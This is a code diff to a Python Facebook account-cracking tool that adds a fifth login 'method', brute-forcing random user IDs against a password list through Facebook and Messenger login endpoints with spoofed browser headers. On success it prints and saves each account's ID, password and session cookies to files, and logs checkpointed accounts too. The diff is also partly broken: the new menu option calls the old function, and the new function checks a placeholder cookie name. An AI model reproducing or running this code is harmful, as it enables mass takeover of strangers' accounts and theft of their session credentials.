@@ -376,7 +376,7 @@ def bd():
 		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
 		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
 		clear()
-		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G}\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]{G} ');linex()
+		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G}\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]{G}\n{G}[{A}5{G}]{G} METHOD {G}[{A}M5{G}]{G} ');linex()
 		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		for nmbr in range(limit):
 			nmp=''.join(random.choice(string.digits) for _ in range(6))
@@ -397,6 +397,8 @@ def bd():
 				if mthd in ['3','03']:
 					habib.submit(rndm3,uid,passlist)
 				if mthd in ['4','04']:
+					habib.submit(rndm4,uid,passlist)
+				if mthd in ['5','05']:
 					habib.submit(rndm4,uid,passlist)
 		print('\033[1;37m')
 		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -1342,9 +1344,74 @@ def rndm4(uid,passlist):
 'user-agent': au,
 'x-asbd-id': '129477',
 'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
-                        session.post(f'https://web.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
+                        session.post(f'https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+                                        coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
+                                        cid = re.findall('c_user=(.*);xs', coki)[0]
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
+                                        print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
+                                        open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(cid)
+                                        cek_apk(coki)
+                                        return True
+                        elif 'checkpoint' in log_cookies:
+                                        coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                                        coki1 = coki.split("1000")[1]
+                                        uid = "1000"+coki1[0:11]
+                                        print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
+                                        cps.append(uid)
+                                        return True
+                               
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                pass
+
+
+def rndm5(uid,passlist):
+        global loop
+        global oks
+        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M5{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        session=requests.Session()
+        au=Ugen()
+        try:
+                for pas in passlist:
+                        free_fb = session.get(f'https://www.messenger.com').text
+                        data ={'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+'initial_request_id': 'Ab9rXVaqYtjLARnu1FsGwTq',
+'timezone': '-330',
+'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+'lgnrnd': '055850_c2gE',
+'lgnjs': 'n',
+'email': uid,
+'pass': f'#PWD_BROWSER:0:{int(time.time())}:{pas}',
+'default_persistent': '',}
+                        headers={'Host': 'www.messenger.com',
+'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+'Accept-Language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+'Cache-Control': 'max-age=0',
+'Content-Type': 'application/x-www-form-urlencoded',
+'Cookie': 'datr=-AfXZhh2mJijm2B4WGrNQFPW; sb=CQjXZg29gHjxhOY9RLl3yjXj; wd=885x773',
+'Origin': 'https://www.messenger.com',
+'Priority': 'u=0, i',
+'Referer': 'https://www.messenger.com/login/password/',
+'Sec-CH-UA': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+'Sec-CH-UA-Mobile': '?0',
+'Sec-CH-UA-Platform': '"Windows"',
+'Sec-Fetch-Dest': 'document',
+'Sec-Fetch-Mode': 'navigate',
+'Sec-Fetch-Site': 'same-origin',
+'Sec-Fetch-User': '?1',
+'Upgrade-Insecure-Requests': '1',
+'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+'Content-Length': '417',}
+                        session.post(f'https://www.messenger.com/login/password/',data=data,headers=headers).text
+                        log_cookies=session.cookies.get_dict().keys()
+                        if 'some_key' in log_cookies:
                                         coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                                         cid = re.findall('c_user=(.*);xs', coki)[0]
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
